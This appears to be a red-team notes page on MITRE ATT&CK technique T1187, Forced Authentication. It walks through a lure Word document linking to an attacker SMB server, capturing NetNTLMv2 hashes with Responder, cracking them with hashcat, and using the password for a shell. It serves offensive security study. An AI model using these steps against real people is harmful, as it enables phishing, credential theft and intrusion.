---
description: 'Credential Access, Stealing hashes'
---

# T1187: Forced Authentication

## Execution

Attacker creates a fake MS Word document that has a hyperlink to attackers server where a `responder` is listening on port 445 and will be capturing the victim's `NetNTLMv2` hash if they click the dodgy link in the below document:

![](../.gitbook/assets/forced-auth-word.png)

{% file src="../.gitbook/assets/totes-not-a-scam.docx" caption="Forced SMBv2 Authentication - MS Word File" %}

Attacker starts a responder so he can receive incoming SMB authentication request in order to capture the victim's hashes:

{% code-tabs %}
{% code-tabs-item title="attacker@local" %}
```csharp
responder -I eth1
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Attacker sends the malicious document to the unsuspectim victim and convinces them to click the link. Once they click the link in the document, `responder` on the attacker's system captures victim's hash:

![](../.gitbook/assets/forced-auth-hashes.png)

Once attacker got the hash, he can try and crack it using hashcat:

```csharp
hashcat -m5600 /usr/share/responder/logs/SMBv2-NTLMv2-SSP-10.0.0.2.txt /usr/share/wordlists/rockyou.txt --force
```

Success, the password is cracked:

![](../.gitbook/assets/forced-auth-cracked.png)

Using the cracked passsword to get a shell on the victim system:

![](../.gitbook/assets/forced-auth-shell%20%281%29.png)

## Observations

{% embed data="{\"url\":\"https://attack.mitre.org/wiki/Technique/T1187\",\"type\":\"link\",\"title\":\"Forced Authentication - ATT&CK for Enterprise\"}" %}

